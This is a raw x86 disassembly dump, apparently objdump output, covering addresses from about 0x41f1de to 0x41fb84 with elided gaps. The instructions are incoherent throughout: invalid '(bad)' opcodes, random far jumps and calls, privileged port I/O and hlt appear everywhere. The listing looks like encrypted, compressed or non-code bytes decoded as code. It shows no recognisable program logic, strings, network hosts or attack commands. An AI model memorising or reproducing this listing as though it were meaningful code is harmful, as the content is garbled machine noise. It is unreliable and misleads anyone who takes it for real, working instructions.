  41f1de:	xor    dl,BYTE PTR [ebx]
  41f1e0:	sub    edi,DWORD PTR [edi]
  41f1e2:	outs   dx,DWORD PTR ds:[esi]
  41f1e3:	sahf   
  41f1e4:	push   cs
  41f1e5:	pusha  
  41f1e6:	dec    edi
  41f1e7:	inc    ecx
  41f1e8:	pop    esi
  41f1e9:	dec    esp
  41f1ea:	daa    
  41f1eb:	sar    DWORD PTR [edx],1
  41f1ed:	sub    eax,0x45a12898
  41f1f2:	hlt    
  41f1f3:	scas   al,BYTE PTR es:[edi]
  41f1f4:	xchg   ebp,eax
  41f1f5:	daa    
  41f1f6:	addr16 adc dh,ch
  41f1f9:	dec    ebp
  41f1fa:	xor    BYTE PTR [edx],dh
  41f1fc:	repnz mov edi,0xc7ae958b
  41f202:	out    0x49,al
  41f204:	shl    BYTE PTR [ebx+0x32],0xa3
  41f208:	jae    0x41f20f
  41f20a:	xor    al,0x7c
  41f20c:	add    BYTE PTR [edx],dh
  41f20e:	pop    ebx
  41f20f:	not    BYTE PTR [eax+0x20e6b7e8]
  41f215:	outs   dx,DWORD PTR ds:[esi]
  41f216:	push   0xffffff9b
  41f218:	sbb    cl,BYTE PTR [ebp+esi*8-0xc2e615e]
  41f21f:	into   
  41f220:	push   ebp
  41f221:	je     0x41f1f0
  41f223:	jmp    0x41f21a
  41f225:	cmp    bh,dh
  41f227:	add    al,dl
  41f229:	cli    
  41f22a:	mov    eax,ds:0xc904a53d
  41f22f:	int    0x80
  41f231:	repz ret 0x6f8c
  41f235:	mov    esi,0x1c6e582a
  41f23a:	cdq    
  41f23b:	pop    es
  41f23c:	and    eax,0x9e4debe4
  41f241:	fwait
  41f242:	cs repnz out 0xe,al
  41f246:	dec    eax
  41f247:	or     eax,0x74ec6a8d
  41f24c:	hlt    
  41f24d:	mov    WORD PTR [edi],cs
  41f24f:	adc    ch,BYTE PTR [eax]
  41f251:	shr    DWORD PTR [ebp-0x57021774],1
  41f257:	sti    
  41f258:	jne    0x41f213
  41f25a:	xor    eax,0xe0e45828
  41f25f:	jne    0x41f24a
  41f261:	fsub   st(2),st
  41f263:	or     ebp,edi
  41f265:	inc    esp
  41f266:	adc    al,0x92
  41f268:	fs push eax
  41f26a:	(bad)  
  41f26c:	dec    eax
  41f26d:	adc    al,0xe6
  41f26f:	jg     0x41f219
  41f271:	or     DWORD PTR [eax-0x49f3e88f],esi
  41f277:	add    edx,edx
  41f279:	dec    esp
  41f27a:	scas   al,BYTE PTR es:[edi]
  41f27b:	sahf   
  41f27c:	(bad)  
  41f27d:	das    
  41f27e:	in     eax,0x94
  41f280:	out    0xec,eax
  41f282:	dec    edi
  41f283:	les    esi,FWORD PTR [edi+0xdbb5d7d]
  41f289:	adc    ecx,esi
  41f28b:	xor    al,dl
  41f28d:	out    0xb2,eax
  41f28f:	xchg   BYTE PTR [eax],al
	...
  41f2f1:	add    BYTE PTR [eax],al
  41f2f3:	add    BYTE PTR [ecx+0x1b],dl
  41f2f6:	jmp    DWORD PTR [esi-0x1]
  41f2f9:	out    0xd9,al
  41f2fb:	aas    
  41f2fc:	jo     0x41f2eb
  41f2fe:	sahf   
  41f2ff:	jb     0x41f31d
  41f301:	js     0x41f2a4
  41f303:	icebp  
  41f304:	mov    esp,0x400014b
  41f309:	add    DWORD PTR [eax],eax
  41f30b:	add    BYTE PTR [edi+0x36f2dc50],ch
  41f311:	adc    ch,BYTE PTR ds:0xaffee3d2
  41f317:	mov    bh,0x8a
  41f319:	dec    ebp
  41f31a:	xor    eax,0x51afa319
  41f31f:	xor    edx,DWORD PTR [ebx+0x66]
  41f322:	cmp    al,0x87
  41f324:	jmp    0x41f2b2
  41f326:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f327:	inc    esp
  41f328:	dec    edx
  41f329:	icebp  
  41f32a:	mov    WORD PTR [ebx+esi*1-0x653e4a64],?
  41f331:	push   ss
  41f332:	pop    ebx
  41f333:	jg     0x41f343
  41f335:	pop    es
  41f336:	mov    ebp,0x1c65c07d
  41f33b:	pop    ebp
  41f33c:	loop   0x41f34c
  41f33e:	push   ebp
  41f33f:	adc    al,0x11
  41f341:	retf   0xd6cf
  41f344:	inc    edx
  41f345:	push   eax
  41f346:	jge    0x41f31f
  41f348:	jbe    0x41f2f9
  41f34a:	sub    ecx,edi
  41f34c:	jbe    0x41f31d
  41f34e:	inc    ecx
  41f34f:	lds    eax,FWORD PTR [ebp+0x60]
  41f352:	rol    BYTE PTR [ecx],0xff
  41f355:	imul   BYTE PTR [esi+0x3b]
  41f358:	and    cl,ch
  41f35a:	jl     0x41f35c
  41f35c:	fcom   DWORD PTR [esi+0x22]
  41f35f:	stos   DWORD PTR es:[edi],eax
  41f360:	sbb    eax,0x466b4aea
  41f365:	inc    edi
  41f366:	(bad)  
  41f367:	jmp    0x41f39b
  41f369:	call   0xd2b6:0xa2ae
  41f36f:	sbb    DWORD PTR ds:0xe2d1a9be,eax
  41f375:	xlat   BYTE PTR ds:[ebx]
  41f376:	repz mov al,0xb4
  41f379:	lea    ecx,[ecx+0x72862871]
  41f37f:	adc    ecx,ecx
  41f381:	outs   dx,BYTE PTR ds:[esi]
  41f382:	lea    edx,[eiz*8+0x51055c1c]
  41f389:	sbb    dh,bh
  41f38b:	stc    
  41f38c:	rcr    ebx,0x40
  41f38f:	(bad)
  41f392:	aam    0x2a
  41f394:	call   0xacc9d833
  41f399:	inc    esp
  41f39a:	and    BYTE PTR [esi-0xc],0x7a
  41f39e:	hlt    
  41f39f:	xchg   eax,ebp
  41f3a1:	sub    DWORD PTR [esi+0x19b9e77c],ebp
  41f3a7:	mov    DWORD PTR [edx+ebp*4],esi
  41f3aa:	xor    esi,DWORD PTR gs:[edx+eax*8]
  41f3ae:	or     BYTE PTR [ecx+0x2],ch
  41f3b1:	cmp    DWORD PTR [edx-0x45a79b76],eax
  41f3b7:	stc    
  41f3b8:	rcr    cl,cl
  41f3ba:	adc    BYTE PTR [eax],al
  41f3bc:	in     eax,dx
  41f3bd:	mov    BYTE PTR [eax],dl
  41f3bf:	ret    
  41f3c0:	popf   
  41f3c1:	sub    al,0xa
  41f3c3:	mov    ds:0x9ccad341,eax
  41f3c8:	enter  0x4c1c,0x55
  41f3cc:	cmp    edi,DWORD PTR [eax]
  41f3ce:	sub    al,0xa1
  41f3d0:	cmc    
  41f3d1:	out    0x9c,al
  41f3d3:	push   cs
  41f3d4:	add    eax,0x1d486fad
  41f3d9:	aad    0x16
  41f3db:	xchg   ebp,eax
  41f3dc:	or     al,0xe7
  41f3de:	or     DWORD PTR [edx],eax
  41f3e0:	mov    al,0xf7
  41f3e2:	mov    ?,WORD PTR [eax]
  41f3e4:	(bad)  
  41f3e5:	sbb    BYTE PTR [ebx],bl
  41f3e7:	call   0xebefd16f
  41f3ec:	jno    0x41f45a
  41f3ee:	ja     0x41f402
  41f3f0:	dec    ebx
  41f3f1:	daa    
  41f3f2:	sub    esi,DWORD PTR [edi+ecx*4]
  41f3f5:	push   ds
  41f3f6:	leave  
  41f3f7:	mov    dl,0xf6
  41f3f9:	into   
  41f3fa:	jg     0x41f477
  41f3fc:	cmp    BYTE PTR [bx+di+0x2f],0x96
  41f401:	mov    ebp,0xf935ef7d
  41f406:	es mov bl,0x1
  41f409:	mov    cl,0xf8
  41f40b:	ficom  DWORD PTR [ebx+0xd55262]
	...
  41f471:	add    BYTE PTR [eax],al
  41f473:	add    BYTE PTR [edi+eiz*8],bh
  41f476:	imul   ebp,edi,0xfffffffb
  41f479:	out    dx,eax
  41f47a:	mov    esp,0xd5fd13f7
  41f47f:	mov    ch,0xb0
  41f481:	jg     0x41f438
  41f483:	mov    eax,es
  41f485:	dec    esp
  41f486:	add    DWORD PTR [eax],eax
  41f488:	add    al,0x1
  41f48a:	add    BYTE PTR [eax],al
  41f48c:	pop    ss
  41f48d:	push   ss
  41f48e:	push   ss
  41f48f:	rcr    DWORD PTR [ebx+0x56],1
  41f492:	pop    esi
  41f493:	cmp    ebp,edi
  41f495:	and    DWORD PTR [eax+0x4f],0xffffffff
  41f499:	(bad)  
  41f49b:	dec    edi
  41f49c:	je     0x41f49b
  41f49e:	sub    eax,0xd5f742b5
  41f4a3:	mov    bl,0xf8
  41f4a5:	mov    ebp,0xa04971dd
  41f4aa:	out    0x4a,eax
  41f4ac:	test   eax,0x92c5706
  41f4b1:	or     al,0x72
  41f4b3:	mov    dl,0xa3
  41f4b5:	(bad)  
  41f4b6:	jp     0x41f511
  41f4b8:	xor    bl,BYTE PTR [ecx-0x71]
  41f4bb:	push   0x21
  41f4bd:	dec    eax
  41f4be:	(bad)  
  41f4bf:	xor    DWORD PTR [ebx-0x25d32b48],edx
  41f4c5:	mov    bl,0xea
  41f4c7:	nop
  41f4c8:	jno    0x41f4d8
  41f4ca:	fs int 0x6f
  41f4cd:	fld    QWORD PTR [edx]
  41f4cf:	xlat   BYTE PTR ds:[ebx]
  41f4d0:	pop    ecx
  41f4d1:	rcr    BYTE PTR [ebx+0x26],0xc3
  41f4d5:	aam    0x14
  41f4d7:	clc    
  41f4d8:	jmp    0x41f557
  41f4da:	jp     0x41f4cd
  41f4dc:	fcom   DWORD PTR [esi+0x6c]
  41f4df:	mov    bl,0x14
  41f4e1:	add    DWORD PTR ds:0x9dcb2b23,esi
  41f4e7:	xchg   esp,eax
  41f4e8:	xchg   esi,eax
  41f4e9:	fst    DWORD PTR [eax-0x2ff5a73c]
  41f4ef:	xchg   ecx,eax
  41f4f0:	sbb    bh,BYTE PTR [esi-0x11]
  41f4f3:	popf   
  41f4f4:	sbb    edi,eax
  41f4f6:	and    eax,0xe2db8af5
  41f4fb:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41f4fd:	(bad)  
  41f4ff:	xor    eax,ebx
  41f501:	stos   BYTE PTR es:[edi],al
  41f502:	push   0x21db2ac4
  41f507:	or     ebx,DWORD PTR [eax-0x3a1e57bc]
  41f50d:	adc    bh,BYTE PTR [ebx+0x51]
  41f510:	stos   BYTE PTR es:[edi],al
  41f511:	loop   0x41f4f0
  41f513:	inc    edx
  41f514:	mov    eax,ebp
  41f516:	push   ebx
  41f517:	adc    al,BYTE PTR [ebp+edi*1-0x713787de]
  41f51e:	sub    DWORD PTR [ebx-0x63],ebp
  41f521:	test   DWORD PTR [ebp-0x78],0x47605338
  41f528:	rcr    BYTE PTR [ecx],cl
  41f52a:	push   esp
  41f52b:	push   cs
  41f52c:	cmp    BYTE PTR [edx-0x55521b3f],dl
  41f532:	push   esp
  41f533:	mov    ecx,0xb47c761f
  41f538:	mov    cl,0x42
  41f53a:	xor    al,0xbe
  41f53c:	in     al,dx
  41f53d:	fwait
  41f53e:	or     DWORD PTR [edx-0x51716169],eax
  41f544:	dec    esp
  41f545:	jp     0x41f5bc
  41f547:	jne    0x41f53f
  41f549:	mov    BYTE PTR [esi+0x3d],bl
  41f54c:	int    0xd1
  41f54e:	(bad)  
  41f54f:	cmp    DWORD PTR [ebx+0x4315d158],edi
  41f555:	or     edi,DWORD PTR [ebp-0x84c3f1a]
  41f55b:	repz enter 0x7c39,0x91
  41f560:	or     al,0x5a
  41f562:	aad    0xc0
  41f564:	and    ah,dl
  41f566:	sub    cl,al
  41f568:	and    ah,bh
  41f56a:	xchg   esp,eax
  41f56b:	das    
  41f56c:	in     eax,dx
  41f56d:	mov    ah,0x41
  41f56f:	pop    ebp
  41f570:	push   edx
  41f571:	out    dx,al
  41f572:	sti    
  41f573:	lock push es
  41f575:	xchg   ebx,ebx
  41f577:	xchg   esi,eax
  41f578:	pop    eax
  41f579:	out    dx,al
  41f57a:	and    al,0x2
  41f57c:	xchg   esp,edx
  41f57e:	fwait
  41f57f:	or     DWORD PTR [edi+ecx*1],esi
  41f582:	das    
  41f583:	mov    edx,0xeba16763
  41f588:	mov    cl,0x73
  41f58a:	xor    BYTE PTR [ebp+0x5d],bh
  41f58d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f58e:	out    dx,al
  41f58f:	pop    eax
	...
  41f5f4:	js     0x41f62a
  41f5f6:	add    bh,bl
  41f5f8:	dec    esi
  41f5f9:	(bad)  
  41f5fa:	stc    
  41f5fb:	mov    bh,0xb7
  41f5fd:	jmp    0x279c:0xd836d422
  41f604:	les    ecx,FWORD PTR [ebp+0x1]
  41f607:	add    BYTE PTR [ecx+eax*1],al
  41f60a:	add    BYTE PTR [eax],al
  41f60c:	fisub  DWORD PTR [edi]
  41f60e:	shl    BYTE PTR [eax-0x28],1
  41f611:	aas    
  41f612:	ret    
  41f613:	inc    ebx
  41f614:	scas   al,BYTE PTR es:[edi]
  41f615:	mov    edi,0xb34a3e6e
  41f61a:	sub    DWORD PTR [eax+0x41],esi
  41f61d:	push   ss
  41f61e:	dec    ecx
  41f61f:	rol    DWORD PTR [ecx],0xee
  41f622:	xchg   ebx,eax
  41f623:	out    0x53,eax
  41f625:	dec    BYTE PTR [ebx+ebx*4-0x1ed579dc]
  41f62c:	mov    eax,0xdf8dec58
  41f631:	and    edi,ebp
  41f633:	repz mov dl,0x7
  41f636:	shl    BYTE PTR [ebx],0xfd
  41f639:	ds iret 
  41f63b:	dec    esi
  41f63c:	cli    
  41f63d:	jno    0x41f6ae
  41f63f:	and    eax,0xb8d93f62
  41f644:	add    eax,ebx
  41f646:	pop    es
  41f647:	pop    ds
  41f648:	addr16 sbb ebp,eax
  41f64b:	gs mov esi,0xeddb4e40
  41f651:	retf   0x98e2
  41f654:	cli    
  41f655:	int3   
  41f656:	retf   
  41f657:	bound  edx,QWORD PTR [edi]
  41f659:	sbb    BYTE PTR [edi],ch
  41f65b:	xchg   esi,eax
  41f65c:	and    eax,0xefbd2064
  41f661:	fimul  WORD PTR ds:0xd5fe4284
  41f667:	mov    cl,0xbe
  41f669:	aam    0x8d
  41f66b:	or     eax,edx
  41f66d:	js     0x41f6c1
  41f66f:	inc    edi
  41f670:	cwde   
  41f671:	dec    ecx
  41f672:	sbb    eax,0x41dd483b
  41f677:	cld    
  41f678:	or     BYTE PTR [ecx-0x17],bl
  41f67b:	rcr    DWORD PTR [eax+0x8ad93f3],0x9d
  41f682:	popf   
  41f683:	in     eax,0xd
  41f685:	cwde   
  41f686:	mov    eax,ds:0xcd50c1d9
  41f68b:	jno    0x41f6c4
  41f68d:	push   0x39
  41f68f:	or     edi,eax
  41f691:	adc    al,0xf8
  41f693:	or     edi,DWORD PTR [eax+0x4335d0c1]
  41f699:	mov    bh,0xae
  41f69b:	xor    DWORD PTR ds:0xaa0032eb,eax
  41f6a2:	test   BYTE PTR [esi+0x2de6eb6a],al
  41f6a8:	daa    
  41f6a9:	xor    ah,BYTE PTR [ebx+edi*4+0x6210576f]
  41f6b0:	fnsave [esi+0x39]
  41f6b3:	dec    esp
  41f6b4:	mov    ds:0x9c900a84,eax
  41f6b9:	imul   ecx,eax,0x117dadb4
  41f6bf:	pop    ds
  41f6c0:	test   DWORD PTR [ecx+0x68ae6b0b],edx
  41f6c6:	test   eax,0x25c08020
  41f6cb:	dec    eax
  41f6cc:	fmul   QWORD PTR [eax+0x16b4b030]
  41f6d2:	aaa    
  41f6d3:	pop    eax
  41f6d4:	test   eax,0x99d210a7
  41f6d9:	test   al,0x72
  41f6db:	int    0xb8
  41f6dd:	add    al,0xd8
  41f6df:	push   es
  41f6e0:	inc    edi
  41f6e1:	inc    edx
  41f6e2:	push   ebp
  41f6e3:	in     eax,0xde
  41f6e5:	mov    al,0x8e
  41f6e7:	push   ds
  41f6e8:	repz push edx
  41f6ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6eb:	push   ss
  41f6ec:	push   0x803b9a99
  41f6f1:	rcl    DWORD PTR [edx-0x1f525aea],1
  41f6f7:	ror    bh,0x80
  41f6fa:	das    
  41f6fb:	sbb    eax,0xf1e2c3f2
  41f700:	adc    edi,DWORD PTR [ebp+ecx*4-0x4a51339]
  41f707:	jnp    0x41f6cf
  41f709:	imul   edx,edx,0xfffffff8
  41f70c:	rol    BYTE PTR [eax+0xd],0x33
	...
  41f774:	xchg   edx,eax
  41f775:	cmp    al,0x23
  41f777:	jle    0x41f728
  41f779:	jg     0x41f75a
  41f77b:	cld    
  41f77c:	call   0xdd72:0x4a6c62d2
  41f783:	(bad)  
  41f784:	enter  0x14e,0x0
  41f788:	add    al,0x1
  41f78a:	add    BYTE PTR [eax],al
  41f78c:	out    dx,eax
  41f78d:	mov    eax,0x9e5eb122
  41f792:	cmp    eax,0x72c1f663
  41f797:	jle    0x41f798
  41f799:	sub    eax,0x289982cd
  41f79e:	(bad)  
  41f79f:	push   ebx
  41f7a0:	nop
  41f7a1:	call   0xe6b6b8d6
  41f7a6:	icebp  
  41f7a7:	js     0x41f759
  41f7a9:	in     eax,dx
  41f7aa:	(bad)  
  41f7ab:	dec    esp
  41f7ac:	xor    cl,BYTE PTR [edi]
  41f7ae:	int    0xb7
  41f7b0:	xor    al,0x79
  41f7b2:	fsubp  st(1),st
  41f7b4:	adc    eax,0x3f613509
  41f7b9:	pop    ecx
  41f7ba:	retf   
  41f7bb:	cwde   
  41f7bc:	pop    edx
  41f7bd:	pop    es
  41f7be:	mov    al,ds:0x19ae5ffc
  41f7c3:	sbb    eax,0xa3783652
  41f7c8:	test   BYTE PTR [ebp-0x52e0acb1],ah
  41f7ce:	inc    edx
  41f7cf:	fadd   DWORD PTR [ebp-0x2]
  41f7d2:	jle    0x41f80d
  41f7d4:	jae    0x41f7a5
  41f7d6:	in     al,0x2
  41f7d8:	mov    eax,ds:0x56a206a1
  41f7dd:	popa   
  41f7de:	cs (bad) 
  41f7e1:	push   es
  41f7e2:	mov    ah,0x29
  41f7e4:	popa   
  41f7e5:	sub    BYTE PTR [ebx+ecx*4-0x2d4bacb6],dl
  41f7ec:	repnz or al,0x68
  41f7ef:	xchg   esp,eax
  41f7f0:	mov    esp,DWORD PTR [ecx-0x506d9bfb]
  41f7f6:	ja     0x41f851
  41f7f8:	xor    al,0xdc
  41f7fa:	sub    DWORD PTR [edi],esi
  41f7fc:	dec    ebx
  41f7fd:	sub    dh,bl
  41f7ff:	mov    bl,0xc9
  41f801:	cmp    bh,dh
  41f803:	push   ss
  41f804:	xor    bh,BYTE PTR [edi+0x7f3c28f1]
  41f80a:	jge    0x41f7b4
  41f80c:	into   
  41f80d:	out    0x95,eax
  41f80f:	xor    eax,0x6ccc965f
  41f814:	shl    DWORD PTR [edi+0x4f],1
  41f817:	rol    ch,1
  41f819:	shr    BYTE PTR [edx+eiz*1+0x7571ef41],1
  41f820:	cmp    eax,0xe37fddc1
  41f825:	test   BYTE PTR [ecx+0x13ae3fe],bl
  41f82b:	jne    0x41f894
  41f82d:	retf   0x6368
  41f830:	ret    0xa683
  41f833:	ja     0x41f80c
  41f835:	push   cs
  41f836:	test   DWORD PTR [esi-0x32dc3d96],edx
  41f83c:	imul   DWORD PTR [ecx]
  41f83e:	push   cs
  41f83f:	and    al,0x7
  41f841:	test   DWORD PTR [edi],ebx
  41f843:	stos   BYTE PTR es:[edi],al
  41f844:	(bad)  
  41f845:	or     al,0x80
  41f847:	test   BYTE PTR [esp+edi*4-0x47],0x13
  41f84c:	dec    ebx
  41f84d:	jae    0x41f84a
  41f84f:	xchg   esi,eax
  41f850:	sbb    esp,DWORD PTR [edi-0x39]
  41f853:	(bad)  
  41f855:	out    dx,eax
  41f856:	cli    
  41f857:	jle    0x41f8b1
  41f859:	pop    ss
  41f85a:	push   cs
  41f85b:	and    cl,BYTE PTR [edx]
  41f85d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f85e:	push   ss
  41f85f:	(bad)  
  41f860:	push   ecx
  41f861:	aaa    
  41f862:	mov    dl,0x2
  41f864:	pop    eax
  41f865:	shr    DWORD PTR [edi],cl
  41f867:	xchg   DWORD PTR [edi],ebp
  41f869:	ret    0x91a3
  41f86c:	adc    DWORD PTR [edi-0x13],esi
  41f86f:	clc    
  41f870:	fidiv  WORD PTR [ecx+ecx*2-0x28]
  41f874:	or     BYTE PTR [ebx-0x16588ce3],0x95
  41f87b:	ins    BYTE PTR es:[edi],dx
  41f87c:	jo     0x41f853
  41f87e:	cld    
  41f87f:	sub    ebp,DWORD PTR [ebp-0x51]
  41f882:	jb     0x41f821
  41f884:	les    ecx,FWORD PTR [ecx+0x2d]
  41f887:	xor    ah,BYTE PTR [edx+0x4]
  41f88a:	cwde   
  41f88b:	pop    ebp
  41f88c:	mov    edx,DWORD PTR [edi-0x32]
  41f88f:	pop    ss
	...
  41f8f4:	mov    eax,ds:0x3b920b9a
  41f8f9:	xchg   ebx,eax
  41f8fa:	mov    ecx,0x4183febb
  41f8ff:	pop    edx
  41f900:	and    al,0x6
  41f902:	dec    ebp
  41f903:	stos   BYTE PTR es:[edi],al
  41f904:	int3   
  41f905:	dec    edi
  41f906:	add    DWORD PTR [eax],eax
  41f908:	add    al,0x1
  41f90a:	add    BYTE PTR [eax],al
  41f90c:	gs adc al,0x95
  41f90f:	outs   dx,DWORD PTR ds:[esi]
  41f910:	in     al,dx
  41f911:	out    dx,al
  41f912:	add    DWORD PTR [ebx-0x57],eax
  41f915:	(bad)  
  41f916:	cld    
  41f917:	int3   
  41f918:	add    al,0xaa
  41f91a:	fadd   DWORD PTR [esi]
  41f91c:	adc    bh,BYTE PTR [edx]
  41f91e:	dec    esp
  41f91f:	(bad)  
  41f920:	cmp    al,0xe5
  41f922:	std    
  41f923:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f924:	jge    0x41f99f
  41f926:	sahf   
  41f927:	pop    ebx
  41f928:	and    bh,BYTE PTR [esi+edi*8-0x17]
  41f92c:	fdiv   QWORD PTR fs:[edx-0x13]
  41f930:	clc    
  41f931:	push   esp
  41f932:	pop    ebx
  41f933:	xchg   BYTE PTR [ecx-0x6e],bh
  41f936:	sbb    DWORD PTR [edx+0x23ccb973],ecx
  41f93c:	jecxz  0x41f98f
  41f93e:	imul   esi,eax,0x2e3ff3b0
  41f944:	sub    bl,ch
  41f946:	push   ebp
  41f947:	sbb    eax,0xd7f8192e
  41f94c:	or     al,BYTE PTR [ebx-0xc]
  41f94f:	div    BYTE PTR [ecx+0x13]
  41f952:	xor    bl,ch
  41f954:	mov    DWORD PTR [ebx],esi
  41f956:	in     eax,0x40
  41f958:	in     eax,dx
  41f959:	sar    ah,cl
  41f95b:	xchg   ax,ax
  41f95d:	push   ecx
  41f95e:	push   edi
  41f95f:	in     eax,0xd7
  41f961:	mov    BYTE PTR [edi+edi*1],al
  41f964:	outs   dx,BYTE PTR ds:[esi]
  41f965:	push   ds
  41f966:	pop    edi
  41f967:	data16 xor al,BYTE PTR [edi]
  41f96a:	push   edx
  41f96b:	das    
  41f96c:	pop    edi
  41f96d:	(bad)  
  41f96e:	aad    0xd8
  41f970:	retf   0x9622
  41f973:	pop    edi
  41f974:	pop    eax
  41f975:	mov    ch,0x99
  41f977:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f978:	iret   
  41f979:	xor    eax,0x356de42b
  41f97e:	ds pop ds
  41f980:	mov    dh,0x43
  41f982:	fld    TBYTE PTR [eax+0x3e]
  41f985:	pop    eax
  41f986:	rcr    DWORD PTR [eax+0x48],cl
  41f989:	sti    
  41f98a:	or     ebp,0x43760d78
  41f990:	adc    DWORD PTR [edi],0xffffff8a
  41f993:	push   0x4f
  41f995:	repnz aaa 
  41f997:	mov    eax,0x2c7da166
  41f99c:	hlt    
  41f99d:	cdq    
  41f99e:	lds    edi,FWORD PTR [edi+0x1aadc949]
  41f9a4:	shl    WORD PTR [ebx],cl
  41f9a7:	retf   0xe896
  41f9aa:	fucomi st,st(3)
  41f9ac:	loopne 0x41f963
  41f9ae:	jns    0x41f98c
  41f9b0:	mov    ?,WORD PTR [ebx-0x48]
  41f9b3:	or     eax,0x6651ec81
  41f9b8:	mov    ds:0x230efbd4,al
  41f9bd:	inc    BYTE PTR [ecx+0x48945317]
  41f9c3:	mul    BYTE PTR [edx+ecx*1+0x6044ff6]
  41f9ca:	out    dx,eax
  41f9cb:	or     eax,0x23facbd9
  41f9d0:	(bad)  
  41f9d1:	sbb    dh,BYTE PTR [eax-0x43]
  41f9d4:	or     DWORD PTR [ebx],ebx
  41f9d6:	xor    eax,0x9334f68c
  41f9db:	test   eax,0xa2ef48d0
  41f9e0:	repz pusha 
  41f9e2:	or     bh,BYTE PTR ds:0xe0ca294c
  41f9e8:	jmp    0xf1bd62d6
  41f9ed:	mov    dx,0xbd90
  41f9f1:	add    al,0x2c
  41f9f3:	jne    0x41fa2b
  41f9f5:	and    eax,0x4254237c
  41f9fa:	xor    esp,ebx
  41f9fc:	mov    bl,0xe5
  41f9fe:	loop   0x41fa4b
  41fa00:	xchg   ebx,eax
  41fa01:	mov    DWORD PTR [edx],eax
  41fa03:	jno    0x41f9d6
  41fa05:	mov    edx,0x338eccbb
  41fa0a:	inc    ebp
  41fa0b:	push   es
  41fa0c:	sub    al,0x5f
  41fa0e:	or     edi,DWORD PTR [edi]
	...
  41fa74:	or     al,BYTE PTR [ecx-0x49]
  41fa77:	mov    eax,ds:0xeb1ef7ff
  41fa7c:	and    edx,DWORD PTR [edi-0x5d]
  41fa7f:	adc    eax,0xc41312b1
  41fa84:	rcl    BYTE PTR [eax+0x1],1
  41fa87:	add    BYTE PTR [ecx+eax*1],al
  41fa8a:	add    BYTE PTR [eax],al
  41fa8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa8d:	cwde   
  41fa8e:	jle    0x41fa99
  41fa90:	(bad)  
  41fa91:	aaa    
  41fa92:	push   esi
  41fa93:	push   ebp
  41fa94:	push   cs
  41fa95:	add    bh,BYTE PTR [ebx]
  41fa97:	jbe    0x41fae9
  41fa99:	retf   
  41fa9a:	push   es
  41fa9b:	mov    edx,0x61f6e337
  41faa0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41faa1:	xor    DWORD PTR [esi+ecx*1],edi
  41faa4:	adc    al,BYTE PTR [ebx-0x46]
  41faa7:	sbb    eax,0xb580850b
  41faac:	icebp  
  41faad:	jmp    0x7013:0xf80ab5b0
  41fab4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fab5:	outs   dx,DWORD PTR ds:[esi]
  41fab6:	setns  BYTE PTR [ebx+ebx*8-0x522a4ffd]
  41fabe:	in     al,0x8e
  41fac0:	inc    esp
  41fac1:	out    0x43,eax
  41fac3:	jno    0x41fa94
  41fac5:	pop    edx
  41fac6:	loope  0x41fabc
  41fac8:	lock sub BYTE PTR ss:[edx],dh
  41facc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41facd:	push   ecx
  41face:	dec    ebp
  41facf:	cmp    ebx,DWORD PTR [edx]
  41fad1:	rcr    BYTE PTR [edx+0x7d],1
  41fad4:	jno    0x41fa97
  41fad6:	xchg   ecx,eax
  41fad7:	dec    esi
  41fad8:	out    0x20,eax
  41fada:	aam    0xd2
  41fadc:	jl     0x41fa8b
  41fade:	(bad)  
  41fadf:	in     eax,0x5
  41fae1:	sbb    DWORD PTR [ecx],0x4a
  41fae4:	pop    edx
  41fae5:	imul   ebp,ebp,0x4d
  41fae8:	mov    ch,BYTE PTR [ebp-0x64]
  41faeb:	and    al,0xce
  41faed:	test   eax,0x78bf02f8
  41faf2:	xchg   ebp,eax
  41faf3:	sbb    BYTE PTR [ebx],dl
  41faf5:	cmp    dh,BYTE PTR [ebp+0x1d]
  41faf8:	jg     0x41fabb
  41fafa:	mov    bh,0x42
  41fafc:	mov    ebp,0xe98a0fd1
  41fb01:	xor    al,0x6c
  41fb03:	sbb    DWORD PTR [edx+edx*2],ebx
  41fb06:	in     eax,0x3f
  41fb08:	pop    esp
  41fb09:	ss pusha 
  41fb0b:	aaa    
  41fb0c:	jmp    0x41fac2
  41fb0e:	mov    ebx,0xc92f2dd4
  41fb13:	sub    eax,0x601a00f9
  41fb18:	fnstenv [edi]
  41fb1a:	shl    ebx,0x29
  41fb1d:	mov    cl,0x8a
  41fb1f:	lea    ebx,[esi]
  41fb21:	xor    al,ah
  41fb23:	xlat   BYTE PTR ds:[ebx]
  41fb24:	xchg   DWORD PTR [ebp-0x9],esp
  41fb27:	retf   0x8488
  41fb2a:	fwait
  41fb2b:	data16 sti 
  41fb2d:	out    dx,eax
  41fb2e:	das    
  41fb2f:	stos   DWORD PTR es:[edi],eax
  41fb30:	shl    BYTE PTR [edx+0x4b],1
  41fb33:	sub    eax,0x93e50cc2
  41fb38:	(bad)  
  41fb39:	fcmovb st,st(3)
  41fb3b:	lds    edx,FWORD PTR [ebx]
  41fb3d:	js     0x41fb69
  41fb3f:	and    al,0x3f
  41fb41:	sub    eax,DWORD PTR [edi+0x209df7f6]
  41fb47:	sahf   
  41fb48:	in     al,dx
  41fb49:	dec    ecx
  41fb4a:	leave  
  41fb4b:	mov    ebx,0x921b18c8
  41fb50:	es test al,0x2e
  41fb53:	ins    DWORD PTR es:[edi],dx
  41fb54:	dec    esi
  41fb55:	add    al,0xd5
  41fb57:	dec    ebp
  41fb58:	test   BYTE PTR [eax-0x38],bl
  41fb5b:	mov    eax,ds:0x8924ba2f
  41fb60:	lea    edi,ds:0x62f80d94
  41fb66:	xor    ch,bh
  41fb68:	and    BYTE PTR ds:[ebx-0x68fdc4f1],ah
  41fb6f:	mov    al,0x8e
  41fb71:	pushf  
  41fb72:	and    al,0x3d
  41fb74:	pop    ebp
  41fb75:	call   0x15221e0f
  41fb7a:	push   es
  41fb7b:	cmc    
  41fb7c:	lahf   
  41fb7d:	sbb    al,BYTE PTR [ebx-0x3f40bf81]
  41fb83:	ins    DWORD PTR es:[edi],dx
  41fb84:	test   BYTE PTR cs:[edi+0x42],dl
